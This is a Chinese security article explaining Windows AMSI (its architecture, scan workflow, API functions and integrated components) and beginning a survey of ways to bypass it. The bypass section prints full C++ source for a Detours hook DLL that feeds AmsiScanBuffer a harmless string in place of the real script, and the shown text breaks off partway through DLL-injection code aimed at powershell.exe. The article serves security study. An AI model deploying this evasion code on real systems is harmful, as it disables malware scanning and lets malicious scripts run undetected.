---
title: AMSI简介及绕过方法总结
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458590191&idx=2&sn=5303a8192f311d09f00a5e8db0ef8b38&chksm=b18c2b6586fba273ec05f8faa7549b1333ffdfa2eae97a14b525766ef3df4cb5984c3796b8a4&scene=58&subscene=0#rd
source: 看雪学苑
date: 2025-02-28
fetch_date: 2025-10-06T20:38:09.689462
---

# AMSI简介及绕过方法总结

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8F5rRvjzb0Dk6WcBJvsoaB9tA7aNzvw1rerITsRuGLMYFzH5DcxwXiaNokqX5KENnFsUuEjnicSRQxQ/0?wx_fmt=jpeg)

# AMSI简介及绕过方法总结

mb\_zelrqyxa

看雪学苑

```
1

AMSI介绍
```

AMSI，全称是Antimalware Scan Interface，即：反恶意软件扫描接口。是微软在 Windows 10、Windows server 2016及后续版本中引入的安全机制，目的是为了增强对动态脚本和内存攻击的检测能力。AMSI提供标准化的接口，允许应用程序（如PowerShell、VBScript、Office宏等）在执行代码前，将内容提交给反恶意软件引擎（默认为Windows Defender）进行实时扫描，从而拦截恶意行为。

```
2

AMSI原理
```

2.1 AMSI架构

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8F5rRvjzb0Dk6WcBJvsoaB9MCycbNfSkUbtboIsagpStSbPGn0iau50jVbPTg609qkialE0d6eOicsAQ/640?wx_fmt=other&from=appmsg)

◆应用程序：是使用 AMSI 功能的主体，例如PowerShell、VBScript等。当应用程序处理可能包含恶意代码的数据时，它会调用 AMSI 接口将这些数据传递给反恶意软件进行检查。

◆AMSI接口：是Windows系统的一部分，是应用程序和反恶意软件提供程序之间的桥梁，负责管理客户端与反恶意软件提供程序之间的通信。它通过amsi.dll实现，定义了一组标准的函数和方法，应用程序可以通过调用这些接口函数将数据传递给反恶意软件提供程序进行扫描，并接收扫描结果。

◆反恶意软件提供程序：是实际执行恶意软件扫描的组件，它可以是Windows Defender的内置提供程序，也可以是第三方反恶意软件厂商开发的扫描引擎。

◆任何应用程序都可以调用AMSI接口请求扫描；任何注册的反恶意软件引擎都可以处理扫描请求。

## 2.2 工作流程

◆初始化：当应用程序（如PowerShell）执行代码时，amsi.dll被注入进程内存空间，应用程序调用 AmsiInitialize 函数初始化 AMSI 会话。

◆打开会话：应用程序调用 AmsiOpenSession 函数打开一个新的 AMSI 会话，获取会话句柄。

◆数据扫描：应用程序将需要扫描的数据通过 AmsiScanBuffer 或 AmsiScanString 函数传递给 AMSI 接口，并传入之前获取的会话句柄，AMSI 接口将数据转发给反恶意软件提供程序进行扫描。

◆扫描结果处理：反恶意软件提供程序对数据进行扫描，并将扫描结果返回给 AMSI 接口。AMSI 接口将结果返回给应用程序。应用程序根据扫描结果决定是否继续处理数据，例如，如果扫描结果表明数据包含恶意代码，应用程序可以选择拒绝执行该数据。

◆关闭会话：应用程序在完成扫描操作后，调用 AmsiCloseSession 函数关闭 AMSI 会话。

◆终止会话：应用程序在不再使用 AMSI 功能时，调用 AmsiUninitialize 函数终止 AMSI 会话。

## 2.3 API函数

◆AMSI本身是一个DLL文件，默认路径：C:\Windows\System32

◆amsi.dll主要提供了Win32 API函数以及Com 接口：应用程序可以调用Win32 API 函数来请求扫描；而Com 接口主要提供给反恶意软件产品提供商，安全厂商须调用接口以支持AMSI扫描请求。

（1）Win32 API

```
AmsiCloseSession            关闭由 AmsiOpenSession 打开的会话
AmsiInitialize              初始化 AMSI API
AmsiNotifyOperation         向反恶意软件提供程序发送任意操作的通知
AmsiOpenSession             打开一个会话，在该会话中可以关联多个扫描请求
AmsiResultIsMalware         确定扫描结果是否指示应阻止内容
AmsiScanBuffer              扫描缓冲区内容寻找恶意软件
AmsiScanString              扫描字符串中的恶意软件
AmsiUninitialize            删除最初由 AmsiInitialize 打开的 AMSI API 实例
```

（2）Com 接口

```
IAmsiStream 接口                                  表示要扫描的流
    IAmsiStream：：GetAttribute 方法               流中返回请求的属性
    IAmsiStream：：Read 方法                       请求要读取的缓冲区内容

IAntimalware 接口                                 表示反恶意软件产品
    IAntimalware：：CloseSession 方法              关闭会话
    IAntimalware：：Scan 方法                      扫描内容流

IAntimalware2 接口                                表示反恶意软件产品
    IAntimalware2：：Notify 方法                   向反恶意软件产品发送任意操作的通知

IAntimalwareProvider 接口                         表示反恶意软件产品的提供商
    IAntimalwareProvider：：CloseSession 方法      关闭会话
    IAntimalwareProvider：：DisplayName 方法       要显示的反恶意软件提供程序的名称
    IAntimalwareProvider：：Scan 方法              扫描内容流

IAntimalwareProvider2 接口                        表示反恶意软件产品的提供商
    IAntimalwareProvider2：：Notify 方法           向反恶意软件提供程序发送任意操作的通知
```

##

## 2.4 实现 AMSI 的 Windows 组件

AMSI 功能目前已经集成到 Windows 的这些组件中：

◆用户账户控制

◆PowerShell

◆Windows 脚本解析器：wscript.exe、cscript.exe

◆.NET Assembly

◆WMI

◆JavaScript

◆VBScript

◆Office VBA 宏

## 2.5 防御优势

◆攻击者常使用PowerShell、VBScript等脚本语言动态生成或加密代码，绕过传统的静态签名检测。AMSI与脚本引擎（如PowerShell、JavaScript）深度集成。在脚本解释或编译前，AMSI会将代码（包括动态生成的片段）传递给安全产品扫描。即使恶意代码被拆分、混淆或通过多阶段加载，AMSI也能捕获整体逻辑并分析。

◆内存攻击（如反射式DLL注入）直接在内存中执行恶意代码，不依赖磁盘文件，传统基于文件的扫描难以发现。AMSI通过拦截内存中的代码执行请求（如通过Windows Defender或第三方安全软件），检查进程行为是否异常。例如，当PowerShell尝试调用敏感API时，AMSI会触发扫描，阻断恶意操作。

◆攻击者常用加密混淆恶意代码等方式绕过检测，但是脚本被脚本解释器运行之前，必须将混淆或加密的恶意代码最终还原为可执行形式（如PowerShell脚本解密后为明文字符串），否则脚本引擎或系统加载器无法解析执行。而AMSI在脚本解密后到注入内存执行前的关键节点介入，捕获其明文内容进行扫描，直接针对恶意逻辑本身检测，从而对抗混淆攻击。

```
3

AMSI绕过方法
```

3.1 方法一：利用hook及DLL注入绕过

### 3.1.1 原理

◆应用程序（PowerShell、VBScript、.NET等）在运行脚本或代码前会通过AMSI接口调用Windows系统中已注册的反恶意软件引擎进行扫描，如果检测到恶意内容，AMSI会阻止相关脚本或者代码的执行。

◆AmsiScanBuffer是处理原始二进制数据的核心函数，直接与反恶意软件引擎交互，PowerShell在执行脚本块时，会将代码转换成字节流并通过AmsiScanBuffer进行扫描。

◆AmsiScanBuffer函数定义：

```
HRESULT AmsiScanBuffer(
  HAMSICONTEXT amsiContext,  // AMSI 上下文句柄
  PVOID        buffer,       // 待扫描数据指针
  ULONG        length,       // 数据长度
  LPCWSTR      contentName,  // 内容标识（如脚本名）
  HAMSISESSION amsiSession,  // 会话句柄（可选）
  AMSI_RESULT *result        // 输出扫描结果
);
```

◆攻击者可通过hook劫持AMSI的AmsiScanBuffer扫描函数，将其实际扫描内容（buffer参数）篡改为无害字符串，在送入反恶意软件引擎扫描前清除恶意特征，从而绕过反恶意软件检测。将hook AmsiScanBuffer的具体内容构造成DLL，使用DLL注入将其注入到powershell进程的内存中，从而绕过powershell运行恶意内容时AMSI检测拦截。

### 3.1.2 复现

（1）编写hook AmsiScanBuffer的DLL。

◆劫持 AmsiScanBuffer：通过 Hook，将 AmsiScanBuffer 替换为自定义函数。

◆篡改扫描内容：在自定义函数中，将实际扫描内容替换为无害字符串。

◆欺骗 AMSI：AMSI 扫描的是篡改后的内容，因此不会检测到恶意代码。

```
#include "pch.h"
#include <Windows.h>
#include "detours.h"
#include <amsi.h>
#include <iostream>
#include <sstream>
#include <iomanip>
#include "detours.h"
#pragma comment(lib, "amsi.lib")

#define SAFE "SafeString"

// 保存原始的 AmsiScanBuffer 函数地址，以便在自定义函数中调用
static HRESULT(WINAPI* OriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext,
    PVOID buffer, ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result) = AmsiScanBuffer;

// 自定义函数 _AmsiScanBuffer
__declspec(dllexport) HRESULT _AmsiScanBuffer(HAMSICONTEXT amsiContext,
    PVOID buffer, ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result) {

    std::cout << "[+] AmsiScanBuffer called" << std::endl;
    std::cout << "[+] Buffer " << buffer << std::endl;
    std::cout << "[+] Buffer Length " << length << std::endl;

    // 将传入的 buffer（实际扫描内容）替换为 SAFE（无害字符串）
    // 调用原始 AmsiScanBuffer，但传入的是篡改后的内容，从而绕过检测
    return OriginalAmsiScanBuffer(amsiContext, (BYTE*)SAFE, length, contentName, amsiSession, result);
}

// DLL 入口点
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  dwReason,
    LPVOID lpReserved
)
{
    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    // 初始化hook
    if (dwReason == DLL_PROCESS_ATTACH) {

        AllocConsole();
        freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);

        DetourRestoreAfterWith();
        LONG error = DetourTransactionBegin();
        if (error != NO_ERROR) {
            std::cerr << "[!] Transaction Begin Failed: " << error << std::endl;
            return FALSE;
        }

        error = DetourUpdateThread(GetCurrentThread());
        if (error != NO_ERROR) {
            std::cerr << "[!] UpdateThread Failed: " << error << std::endl;
            DetourTransactionAbort();
            return FALSE;
        }

        // 在 DLL 加载时，使用 DetourAttach 将 AmsiScanBuffer 替换为 _AmsiScanBuffer
        DetourAttach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
        error = DetourTransactionCommit();
        if (error != NO_ERROR) {
            std::cerr << "[!] Commit Failed: " << error << std::endl;
            return FALSE;
        }
        else {
            std::cout << "[+] Detour Success!" << std::endl;
        }
    }
    // DLL 卸载，恢复原始函数
    else if (dwReason == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
        DetourTransactionCommit();
        FreeConsole();
    }
    return TRUE;
}
```

（2）DLL注入代码。

◆通过进程名powershell.exe获取目标进程的PID

◆在目标进程中分配内存，写入 DLL 路径

◆在目标进程中创建远程线程，调用 LoadLibraryA 加载 DLL

◆DLL注入到目标进程powershell.exe中

```
#include <iostream>
#include <windows.h>
#include <TlHelp32.h>

// 注入DLL
BOOL InjectDll(DWORD procID, const char* dllName) {
    char fullDllName[MAX_PATH];
    LPVOID loadLibrary;
    LPVOID remoteString;

    if (procID == 0) {
        return FALSE;
    }

    // 打开目标进程，获取进程句柄
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    if (hProc == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // 获取DLL文件的完整路径
    GetFullPathNameA(dllName, MAX_PATH, fullDllName, NULL);
    std::cout << "[+] Acquired full DLL path: " << fullDllName << std::endl;

    // 获取 LoadLibraryA 函数的地址，用于在目标进程中加载 DLL
    loadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

    // 在目标进程中分配内存，用于存储 DLL 路径
    remoteString = VirtualAllocEx(hProc, NULL...